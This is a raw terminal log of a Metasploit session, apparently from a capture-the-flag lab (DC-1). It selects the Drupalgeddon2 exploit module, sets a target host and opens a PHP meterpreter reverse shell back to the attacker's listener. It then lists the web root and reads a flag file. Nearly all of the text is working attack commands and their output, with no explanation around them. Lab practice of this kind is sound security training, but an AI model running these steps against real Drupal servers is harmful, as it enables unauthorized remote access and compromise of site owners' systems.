root@Blue3:~# msfconsole


      .:okOOOkdc'           'cdkOOOko:.
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
  oOOOOOOOO.MMMM.oOOOOoOOOOl.MMMM,OOOOOOOOo
  dOOOOOOOO.MMMMMM.cOOOOOc.MMMMMM,OOOOOOOOx
  lOOOOOOOO.MMMMMMMMM;d;MMMMMMMMM,OOOOOOOOl
  .OOOOOOOO.MMM.;MMMMMMMMMMM;MMMM,OOOOOOOO.
   cOOOOOOO.MMM.OOc.MMMMM'oOO.MMM,OOOOOOOc
    oOOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOOo
     lOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOl
      ;OOOO'MMM.OOOO.MMM:OOOO.MMM;OOOO;
       .dOOo'WM.OOOOocccxOOOO.MX'xOOd.
         ,kOl'M.OOOOOOOOOOOOO.M'dOk,
           :kk;.OOOOOOOOOOOOO.;Ok:
             ;kOOOOOOOOOOOOOOOk:
               ,xOOOOOOOOOOOx,
                 .lOOOOOOOl.
                    ,dOd,
                      .

       =[ metasploit v5.0.101-dev                         ]
+ -- --=[ 2049 exploits - 1108 auxiliary - 344 post       ]
+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: Enable verbose logging with set VERBOSE true

msf5 > search drupalgeddon

Matching Modules
================

   #  Name                                      Disclosure Date  Rank       Check  Description
   -  ----                                      ---------------  ----       -----  -----------
   0  exploit/unix/webapp/drupal_drupalgeddon2  2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection


msf5 > use exploit/unix/webapp/drupal_drupalgeddon2
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf5 exploit(unix/webapp/drupal_drupalgeddon2) > options

Module options (exploit/unix/webapp/drupal_drupalgeddon2):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   DUMP_OUTPUT  false            no        Dump payload command output
   PHP_FUNC     passthru         yes       PHP function to execute
   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT        80               yes       The target port (TCP)
   SSL          false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI    /                yes       Path to Drupal install
   VHOST                         no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.8      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic (PHP In-Memory)


msf5 exploit(unix/webapp/drupal_drupalgeddon2) > set RHOSTS 192.168.1.6
RHOSTS => 192.168.1.6
msf5 exploit(unix/webapp/drupal_drupalgeddon2) > run

[*] Started reverse TCP handler on 192.168.1.8:4444
[*] Sending stage (38288 bytes) to 192.168.1.6
[*] Meterpreter session 1 opened (192.168.1.8:4444 -> 192.168.1.6:59651) at 2020-08-24 00:45:52 +0700

#
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
#

meterpreter > sysinfo
Computer    : DC-1
OS          : Linux DC-1 3.2.0-6-486 #1 Debian 3.2.102-1 i686
Meterpreter : php/linux
meterpreter > ls
Listing: /var/www
=================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100644/rw-r--r--  174    fil   2013-11-21 03:45:59 +0700  .gitignore
100644/rw-r--r--  5767   fil   2013-11-21 03:45:59 +0700  .htaccess
100644/rw-r--r--  1481   fil   2013-11-21 03:45:59 +0700  COPYRIGHT.txt
100644/rw-r--r--  1451   fil   2013-11-21 03:45:59 +0700  INSTALL.mysql.txt
100644/rw-r--r--  1874   fil   2013-11-21 03:45:59 +0700  INSTALL.pgsql.txt
100644/rw-r--r--  1298   fil   2013-11-21 03:45:59 +0700  INSTALL.sqlite.txt
100644/rw-r--r--  17861  fil   2013-11-21 03:45:59 +0700  INSTALL.txt
100755/rwxr-xr-x  18092  fil   2013-11-01 17:14:15 +0700  LICENSE.txt
100644/rw-r--r--  8191   fil   2013-11-21 03:45:59 +0700  MAINTAINERS.txt
100644/rw-r--r--  5376   fil   2013-11-21 03:45:59 +0700  README.txt
100644/rw-r--r--  9642   fil   2013-11-21 03:45:59 +0700  UPGRADE.txt
100644/rw-r--r--  6604   fil   2013-11-21 03:45:59 +0700  authorize.php
100644/rw-r--r--  720    fil   2013-11-21 03:45:59 +0700  cron.php
100644/rw-r--r--  52     fil   2019-02-19 20:20:46 +0700  flag1.txt
40755/rwxr-xr-x   4096   dir   2013-11-21 03:45:59 +0700  includes
100644/rw-r--r--  529    fil   2013-11-21 03:45:59 +0700  index.php
100644/rw-r--r--  703    fil   2013-11-21 03:45:59 +0700  install.php
40755/rwxr-xr-x   4096   dir   2013-11-21 03:45:59 +0700  misc
40755/rwxr-xr-x   4096   dir   2013-11-21 03:45:59 +0700  modules
40755/rwxr-xr-x   4096   dir   2013-11-21 03:45:59 +0700  profiles
100644/rw-r--r--  1561   fil   2013-11-21 03:45:59 +0700  robots.txt
40755/rwxr-xr-x   4096   dir   2013-11-21 03:45:59 +0700  scripts
40755/rwxr-xr-x   4096   dir   2013-11-21 03:45:59 +0700  sites
40755/rwxr-xr-x   4096   dir   2013-11-21 03:45:59 +0700  themes
100644/rw-r--r--  19941  fil   2013-11-21 03:45:59 +0700  update.php
100644/rw-r--r--  2178   fil   2013-11-21 03:45:59 +0700  web.config
100644/rw-r--r--  417    fil   2013-11-21 03:45:59 +0700  xmlrpc.php

meterpreter > cat flag1.txt
Every good CMS needs a config file - and so do you.
